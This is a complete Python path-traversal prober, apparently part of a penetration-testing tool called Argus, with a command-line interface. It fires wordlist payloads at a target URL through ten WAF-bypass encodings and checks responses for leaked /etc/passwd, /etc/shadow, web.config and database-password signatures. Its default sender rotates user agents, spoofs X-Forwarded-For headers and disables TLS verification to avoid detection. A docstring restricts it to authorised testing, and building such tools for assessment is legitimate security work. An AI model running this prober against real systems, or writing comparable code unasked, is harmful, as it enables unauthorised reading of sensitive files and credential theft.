"""Encoding-ladder path-traversal prober.

Takes a flat one-payload-per-line wordlist (e.g.
``Payloads/Payload_data/path_traversal.txt``) and, for every line, drives an
*escalating encoding ladder* against a single target URL:

    raw  ->  url  ->  double_url  ->  utf8_overlong  ->  percent_u_unicode
         ->  null_byte  ->  hex_marker  ->  base64
         ->  unicode_fullwidth  ->  unicode_alt

The raw payload is tried first. If it fails - i.e. the response body carries
none of the ``SENSITIVE_CONTENT_INDICATORS`` that prove a genuine file read -
each successive encoding is applied and *re-tested against the URL before the
next technique is tried*. The first encoding that confirms a read stops the
ladder for that line and the prober advances to the next line. If no encoding
in the ladder confirms, the line is recorded as a miss and the next line is
attempted.

Design constraints (mirrors app/tools/path_traversal.py and payload_encoder.py):
  - Verification is content-based, never HTTP-status alone: a bare 200/500
    proves nothing about *what* came back.
  - Every encoder is a pure function ``str -> str``; on any transform error the
    raw payload is returned unchanged (fail-safe, never raises).
  - The HTTP send path is injectable (``send_fn``) so the ladder is unit-
    testable offline and can be wired to the shared CommandRunner/curl path or
    plain ``requests``.

Security note
  Only use Argus against targets you own or have written authorisation to
  test. Argus is for authorised security assessment only.
"""

from __future__ import annotations

import argparse
import base64
import random
import sys
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Callable, Iterable, Optional

# Content-based success oracle. Import the shared table when running inside the
# Argus package; fall back to an inline copy for standalone execution so this
# file runs from anywhere without the full app on sys.path.
try:  # pragma: no cover - exercised by both import paths in practice
    from app.tools.utils import SENSITIVE_CONTENT_INDICATORS
except Exception:  # pragma: no cover
    SENSITIVE_CONTENT_INDICATORS = {
        "root:x:0:0:": "LFI/Path Traversal Confirmed (/etc/passwd read success)",
        "DB_PASSWORD": "Secret Disclosure Confirmed (Database configuration leaked)",
        "appSettings": "Web Configuration Leak Confirmed (web.config read success)",
        "uid=": "RCE Confirmed (id command executed successfully)",
        "; for 16-bit app support": "Path Traversal Confirmed (win.ini read success)",
        "[boot loader]": "Path Traversal Confirmed (boot.ini read success)",
        "root:$": "LFI/Path Traversal Confirmed (/etc/shadow read - privileged)",
    }

# Placeholder token substituted with the (encoded) payload inside the URL
# template. `http://host/get?file=FUZZ` -> `.../get?file=<payload>`.
FUZZ_TOKEN = "FUZZ"

def _pct_encode(s: str) -> str:
    """Percent-encode every byte that is not an ASCII alphanumeric, over the
    UTF-8 encoding of ``s``. Unlike ``urllib.quote``, this DOES encode the
    unreserved ``.-_~`` set, so ``../`` -> ``%2e%2e%2f`` as the traversal
    convention expects. Hex is lowercase."""
    out = []
    for b in s.encode("utf-8"):
        c = chr(b)
        out.append(c if c.isalnum() and b < 0x80 else f"%{b:02x}")
    return "".join(out)


_USER_AGENTS = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/91.0.4472.98 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
)


# ---------------------------------------------------------------------------
# Encoding ladder - pure str -> str transforms
# ---------------------------------------------------------------------------
class EncodingLadder:
    """Builds the ordered set of encoded variants for one raw traversal string.

    Each technique targets a distinct normalization/WAF-bypass class. Order is
    least-transformed first, so the cheapest payload that a naive-but-slightly-
    filtered sink accepts is found before the exotic ones.
    """

    # Canonical execution order of the ladder.
    ORDER: tuple[str, ...] = (
        "raw",
        "url",
        "double_url",
        "utf8_overlong",
        "percent_u_unicode",
        "null_byte",
        "hex_marker",
        "base64",
        "unicode_fullwidth",
        "unicode_alt",
    )

    def __init__(self, order: Optional[Iterable[str]] = None) -> None:
        self.order: tuple[str, ...] = tuple(order) if order else self.ORDER
        self._dispatch: dict[str, Callable[[str], str]] = {
            "raw": self._raw,
            "url": self._url,
            "double_url": self._double_url,
            "utf8_overlong": self._utf8_overlong,
            "percent_u_unicode": self._percent_u_unicode,
            "null_byte": self._null_byte,
            "hex_marker": self._hex_marker,
            "base64": self._base64,
            "unicode_fullwidth": self._unicode_fullwidth,
            "unicode_alt": self._unicode_alt,
        }

    def encode(self, payload: str, technique: str) -> str:
        """Apply one named technique. Returns the raw payload on unknown/error."""
        fn = self._dispatch.get(technique)
        if fn is None:
            return payload
        try:
            return fn(payload)
        except Exception:
            return payload  # fail-safe: never break the ladder on one transform

    def variants(self, payload: str) -> list[tuple[str, str]]:
        """Return ordered, de-duplicated ``(technique, encoded)`` pairs.

        Duplicates are dropped so a payload with no encodable characters (rare
        for traversal strings) is not probed with the same bytes twice.
        """
        out: list[tuple[str, str]] = []
        seen: set[str] = set()
        for tech in self.order:
            enc = self.encode(payload, tech)
            if enc not in seen:
                seen.add(enc)
                out.append((tech, enc))
        return out

    # ---- individual encoders ---------------------------------------------
    @staticmethod
    def _raw(p: str) -> str:
        """Untouched payload - tried first."""
        return p

    @staticmethod
    def _url(p: str) -> str:
        """Percent-encode every byte, incl. dots/slashes: ``../`` -> ``%2e%2e%2f``."""
        return _pct_encode(p)

    @staticmethod
    def _double_url(p: str) -> str:
        """Double percent-encode - beats WAFs that decode once before matching:
        ``.`` -> ``%2e`` -> ``%252e``."""
        return _pct_encode(_pct_encode(p))

    @staticmethod
    def _utf8_overlong(p: str) -> str:
        """UTF-8 overlong 2-byte forms for the traversal metacharacters:
        ``.`` -> ``%c0%ae``, ``/`` -> ``%c0%af``, ``\\`` -> ``%c1%9c``.
        Non-metacharacters are left intact so the target file path stays
        readable to the sink."""
        return (
            p.replace(".", "%c0%ae")
             .replace("/", "%c0%af")
             .replace("\\", "%c1%9c")
        )

    @staticmethod
    def _percent_u_unicode(p: str) -> str:
        """IIS ``%uXXXX`` wide-encoding of dot/slash to their fullwidth
        code points: ``.`` -> ``%uff0e``, ``/`` -> ``%uff0f``, ``\\`` -> ``%uff3c``."""
        return (
            p.replace(".", "%uff0e")
             .replace("/", "%uff0f")
             .replace("\\", "%uff3c")
        )

    @staticmethod
    def _null_byte(p: str) -> str:
        """Insert a URL-encoded null byte to truncate suffix-appending sinks.
        Placed before the final ``.ext`` when present (``passwd.php`` ->
        ``passwd%00.php``), otherwise appended (``passwd`` -> ``passwd%00``)."""
        seg = p.rsplit("/", 1)[-1]
        dot = p.rfind(".")
        # Only treat a trailing token as an extension (dot in the final segment,
        # not one of the leading ``../`` dots).
        if dot != -1 and "." in seg and not seg.endswith("."):
            return p[:dot] + "%00" + p[dot:]
        return p + "%00"

    @staticmethod
    def _hex_marker(p: str) -> str:
        """Per-character ``0x``-prefixed hex marker form:
        ``../`` -> ``0x2e0x2e0x2f``."""
        return "".join(f"0x{ord(c):02x}" for c in p)

    @staticmethod
    def _base64(p: str) -> str:
        """Base64 blob of the raw payload: ``../../`` -> ``Li4vLi4v``."""
        return base64.b64encode(p.encode("utf-8")).decode("ascii")

    @staticmethod
    def _unicode_fullwidth(p: str) -> str:
        """Raw (non-ASCII) fullwidth metacharacters - no percent-encoding:
        ``.`` -> ``\uff0e`` (FULLWIDTH FULL STOP), ``/`` -> ``\uff0f``
        (FULLWIDTH SOLIDUS), ``\\`` -> ``\uff3c``. Some frameworks Unicode-
        normalize these back to ``./\\`` after the WAF has inspected raw bytes."""
        return (
            p.replace(".", "\uff0e")
             .replace("/", "\uff0f")
             .replace("\\", "\uff3c")
        )

    @staticmethod
    def _unicode_alt(p: str) -> str:
        """Second raw-Unicode variant using different confusables:
        ``.`` -> ``\u2024`` (ONE DOT LEADER), ``/`` -> ``\u2215``
        (DIVISION SLASH), ``\\`` -> ``\u29f5`` (REVERSE SOLIDUS OPERATOR)."""
        return (
            p.replace(".", "\u2024")
             .replace("/", "\u2215")
             .replace("\\", "\u29f5")
        )


# ---------------------------------------------------------------------------
# Result records
# ---------------------------------------------------------------------------
@dataclass
class LadderHit:
    """One confirmed read for a single source line."""

    line_no: int
    raw_payload: str
    technique: str
    encoded_payload: str
    request_url: str
    indicator: str
    summary: str
    attempts: int  # how many ladder rungs were tried before this hit


@dataclass
class LadderReport:
    """Aggregate outcome of a full-file run."""

    target: str
    lines_read: int = 0
    lines_probed: int = 0
    requests_sent: int = 0
    hits: list[LadderHit] = field(default_factory=list)

    @property
    def success(self) -> bool:
        return bool(self.hits)

    def render(self) -> str:
        header = "--- [TOOLS] ENCODING-LADDER PATH-TRAVERSAL REPORT ---"
        meta = (
            f"Target: {self.target} | lines probed: {self.lines_probed}/"
            f"{self.lines_read} | requests sent: {self.requests_sent} | "
            f"confirmed: {len(self.hits)}"
        )
        if not self.hits:
            return f"{header}\n{meta}\nNo path-traversal reads confirmed."
        lines = [
            f"[!] Path Traversal Success (line {h.line_no}, technique={h.technique}, "
            f"rungs_tried={h.attempts}): {h.summary} [signature: {h.indicator}]\n"
            f"    payload: {h.encoded_payload}"
            for h in self.hits
        ]
        return f"{header}\n{meta}\n" + "\n".join(lines)


# ---------------------------------------------------------------------------
# Prober
# ---------------------------------------------------------------------------
# A send function takes a fully-built request URL and returns the response body
# (str), or "" on any transport failure.
SendFn = Callable[[str], str]


class EncodingLadderProber:
    """Drives the encoding ladder across every line of a payload file."""

    def __init__(
        self,
        url: str,
        *,
        param: Optional[str] = None,
        send_fn: Optional[SendFn] = None,
        ladder: Optional[EncodingLadder] = None,
        timeout: int = 12,
        jitter: tuple[float, float] = (0.05, 0.2),
        stop_on_first_line: bool = False,
    ) -> None:
        """
        Args:
            url: Target URL. If it contains ``FUZZ_TOKEN`` the payload is
                substituted there; else if ``param`` is given the request is
                ``url?param=<payload>``; else the payload is appended to ``url``.
            param: Injectable query-parameter name (used only when the URL has
                no ``FUZZ`` placeholder).
            send_fn: Injectable transport. Defaults to a raw ``http.client``
                sender (rotating UA + spoofed ``X-Forwarded-For``) that puts
                the encoded payload on the wire byte-for-byte. A ``requests``/
                urllib3 client is deliberately NOT used by default: it
                normalizes the URL (decodes ``%2e`` -> ``.``, mangles the
                non-standard ``%uXXXX`` form into ``%25uXXXX``), which silently
                destroys most of the ladder's encodings before they are sent.
            ladder: Custom ``EncodingLadder`` (technique order override).
            timeout: Per-request timeout (seconds) for the default sender.
            jitter: ``(min, max)`` seconds slept before each probe.
            stop_on_first_line: If True, halt the whole run after the first
                line that confirms (fast triage). Default False: probe every
                line and report all confirmations.
        """
        if FUZZ_TOKEN not in url and not param:
            # Deterministic default: append as a bare query value so the URL is
            # always well-formed even without an explicit injection point.
            sep = "&" if "?" in url else "?"
            url = f"{url}{sep}file={FUZZ_TOKEN}"
        elif FUZZ_TOKEN not in url and param:
            sep = "&" if "?" in url else "?"
            url = f"{url}{sep}{param}={FUZZ_TOKEN}"
        self.url_template = url
        self.ladder = ladder or EncodingLadder()
        self.timeout = timeout
        self.jitter = jitter
        self.stop_on_first_line = stop_on_first_line
        self._send = send_fn or self._default_send

    # ---- transport --------------------------------------------------------
    def _build_url(self, encoded_payload: str) -> str:
        return self.url_template.replace(FUZZ_TOKEN, encoded_payload)

    @staticmethod
    def _wire_selector(selector: str) -> str:
        """Render a raw path?query for the HTTP request line without letting
        any layer re-encode it. ASCII bytes (incl. literal ``%2e`` / ``%uff0e``)
        pass through untouched; only bytes >= 0x80 (from the raw-Unicode
        variants) are percent-encoded, which servers decode back identically."""
        out = []
        for b in selector.encode("utf-8"):
            out.append(chr(b) if b < 0x80 else f"%{b:02x}")
        return "".join(out)

    def _default_send(self, request_url: str) -> str:
        """Raw ``http.client`` sender. Returns response body or "" on failure.

        Uses the low-level client so the exact encoded bytes reach the target;
        ``requests``/urllib3 would normalize them (see class docstring).
        """
        import http.client
        from urllib.parse import urlsplit

        parts = urlsplit(request_url)
        # urlsplit does NOT percent-decode - path/query survive verbatim.
        selector = parts.path or "/"
        if parts.query:
            selector += "?" + parts.query
        selector = self._wire_selector(selector)

        headers = {
            "Host": parts.netloc,
            "User-Agent": random.choice(_USER_AGENTS),
            "X-Forwarded-For": ".".join(str(random.randint(1, 255)) for _ in range(4)),
            "Accept": "*/*",
            "Connection": "close",
        }
        conn = None
        try:
            if parts.scheme == "https":
                import ssl
                ctx = ssl._create_unverified_context()
                conn = http.client.HTTPSConnection(
                    parts.hostname, parts.port or 443, timeout=self.timeout, context=ctx
                )
            else:
                conn = http.client.HTTPConnection(
                    parts.hostname, parts.port or 80, timeout=self.timeout
                )
            # skip_host: we set the Host header ourselves (already URL-safe).
            conn.putrequest("GET", selector, skip_host=True, skip_accept_encoding=True)
            for k, v in headers.items():
                conn.putheader(k, v)
            conn.endheaders()
            resp = conn.getresponse()
            return resp.read().decode("utf-8", errors="ignore")
        except Exception:
            return ""
        finally:
            if conn is not None:
                try:
                    conn.close()
                except Exception:
                    pass

    # ---- verification -----------------------------------------------------
    @staticmethod
    def _match_indicator(body: str) -> Optional[tuple[str, str]]:
        """Return ``(indicator, summary)`` for the first sensitive signature
        present in ``body``, else None. Content-based - status is ignored."""
        if not body:
            return None
        for indicator, summary in SENSITIVE_CONTENT_INDICATORS.items():
            if indicator in body:
                return indicator, summary
        return None

    # ---- main loop --------------------------------------------------------
    @staticmethod
    def iter_payload_lines(path: Path) -> Iterable[tuple[int, str]]:
        """Yield ``(line_no, payload)`` for non-blank, non-comment lines."""
        text = path.read_text(encoding="utf-8", errors="ignore")
        for i, raw in enumerate(text.splitlines(), start=1):
            line = raw.rstrip("\r\n")
            if not line.strip() or line.lstrip().startswith("#"):
                continue
            yield i, line

    def probe_line(self, line_no: int, payload: str) -> tuple[Optional[LadderHit], int]:
        """Run the full ladder for one payload line.

        Returns ``(hit_or_None, requests_sent)``. Stops at the first rung whose
        response confirms a read.
        """
        sent = 0
        for idx, (technique, encoded) in enumerate(self.ladder.variants(payload), start=1):
            lo, hi = self.jitter
            if hi > 0:
                time.sleep(random.uniform(lo, hi))
            request_url = self._build_url(encoded)
            body = self._send(request_url)
            sent += 1
            match = self._match_indicator(body)
            if match:
                indicator, summary = match
                return (
                    LadderHit(
                        line_no=line_no,
                        raw_payload=payload,
                        technique=technique,
                        encoded_payload=encoded,
                        request_url=request_url,
                        indicator=indicator,
                        summary=summary,
                        attempts=idx,
                    ),
                    sent,
                )
        return None, sent

    def run(self, payload_file: str | Path, max_lines: Optional[int] = None) -> LadderReport:
        """Probe every line of ``payload_file`` through the encoding ladder.

        Args:
            payload_file: Path to a one-payload-per-line wordlist.
            max_lines: Optional cap on how many payload lines to probe.

        Returns:
            LadderReport: aggregate outcome with every confirmed read.
        """
        path = Path(payload_file)
        report = LadderReport(target=self._build_url("<payload>"))
        for line_no, payload in self.iter_payload_lines(path):
            report.lines_read += 1
            if max_lines is not None and report.lines_probed >= max_lines:
                continue
            report.lines_probed += 1
            hit, sent = self.probe_line(line_no, payload)
            report.requests_sent += sent
            if hit:
                report.hits.append(hit)
                if self.stop_on_first_line:
                    break
        return report


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------
def _build_arg_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="encoding_ladder",
        description=(
            "Escalating encoding-ladder path-traversal prober. Tries each "
            "payload line raw, then through url/double-url/utf8-overlong/"
            "%u-unicode/null-byte/hex/base64/raw-unicode encodings until a "
            "sensitive-file read is content-confirmed, then advances to the "
            "next line."
        ),
    )
    p.add_argument(
        "--url", required=True,
        help=("Target URL. Put the token FUZZ where the payload goes "
              "(e.g. 'http://host/get?file=FUZZ'); otherwise use --param."),
    )
    p.add_argument(
        "--payloads", required=True,
        help="Path to the one-payload-per-line wordlist "
             "(e.g. Payloads/Payload_data/path_traversal.txt).",
    )
    p.add_argument("--param", default=None,
                   help="Injectable query param name when --url has no FUZZ token.")
    p.add_argument("--timeout", type=int, default=12, help="Per-request timeout (s).")
    p.add_argument("--max-lines", type=int, default=None,
                   help="Cap the number of payload lines probed.")
    p.add_argument("--stop-on-first", action="store_true",
                   help="Halt the whole run at the first confirmed line.")
    p.add_argument("--no-jitter", action="store_true",
                   help="Disable inter-request sleep (faster, noisier).")
    return p


def main(argv: Optional[list[str]] = None) -> int:
    args = _build_arg_parser().parse_args(argv)
    prober = EncodingLadderProber(
        args.url,
        param=args.param,
        timeout=args.timeout,
        jitter=(0.0, 0.0) if args.no_jitter else (0.05, 0.2),
        stop_on_first_line=args.stop_on_first,
    )
    report = prober.run(args.payloads, max_lines=args.max_lines)
    print(report.render())
    return 0 if report.success else 1


if __name__ == "__main__":  # pragma: no cover
    sys.exit(main())
